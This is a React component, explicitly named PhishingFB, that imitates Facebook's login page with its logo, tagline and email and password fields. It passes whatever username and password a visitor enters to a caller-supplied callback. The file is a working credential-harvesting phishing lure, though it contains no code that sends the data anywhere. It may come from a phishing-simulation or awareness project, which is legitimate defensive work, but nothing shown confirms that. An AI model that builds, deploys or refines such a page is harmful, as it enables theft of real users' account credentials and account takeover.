import { useState } from "react";
import facebooklogo from "../../assets/facebooklogo.png";
export const PhishingFB = ({ submitCb = null }) => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  return (
    <div class="bg-gray-100 overflow-hidden">
      <div class="container bg-gray-100 h-[100vh] flex items-center justify-center  mt-[-20px] sm:flex-col md:flex-row w-[100vw]">
        <div class="left w-2/4 mx-8 sm:w-[80%]md:w-[50%] lg:w-[50%]">
          <img
            class="w-60 md:w-60 sm:w-44 sm:m-auto "
            src={facebooklogo}
            alt="loading image!"
          />
          <p class=" create-p text-3xl mx-4 sm:text-[15px] md:text-2xl lg:text-3xl sm:text-center mb-4">
            Facebook helps you connect and share with the people in yours life.
          </p>
        </div>
        <div class="right flex flex-col bg-white p-8  rounded-lg w-1/3 shadow-lg sm:w-[90%] md:w-[50%] lg:w-[33.33%]">
          <p class="fblogP text-center md:hidden mt-0 mb-2 sm:text-lg sm:font-bold">
            Log into Facebook
          </p>
          <input
            class="border-[1px] border-gray-400 rounded-md border-opacity-50 text-xl px-4 h-12 my-2 w-auto  focus:border-blue-600 focus:border-[1px] focus:outline-none hover:border-black hover:border-[1px]"
            type="text"
            placeholder="Email address or phone number"
            onChange={(e) => setUsername(e.target.value)}
          />
          <input
            class="border-[1px] border-gray-400 rounded-md border-opacity-50 text-xl px-4 h-12 my-2 w-auto  focus:border-blue-600 focus:border-[1px] focus:outline-none hover:border-black hover:border-[1px]"
            type="password"
            placeholder="Password"
            onChange={(e) => setPassword(e.target.value)}
          />
          <button
            onClick={() => {
              if (submitCb) submitCb({ username, password });
            }}
            class="logBtn w-auto py-2 bg-blue-600 my-2 text-2xl text-white rounded-md hover:bg-blue-700 active:bg-blue-800 duration-200"
          >
            Log In
          </button>
          <a
            class="my-2 w-auto text-center target text-blue-600 hover:underline"
            href="forget.html"
          >
            Forgotten password?
          </a>
          <hr />
          {/* <button class="width-1/3 mx-auto py-2 bg-blue-800 mt-6 text-xl text-white rounded-md px-4 hover:bg-green-600 active:bg-blue-800 duration-200 createBtn">
            <a href="thanks.html">Create New Account</a>
          </button> */}
        </div>
      </div>
    </div>
  );
};
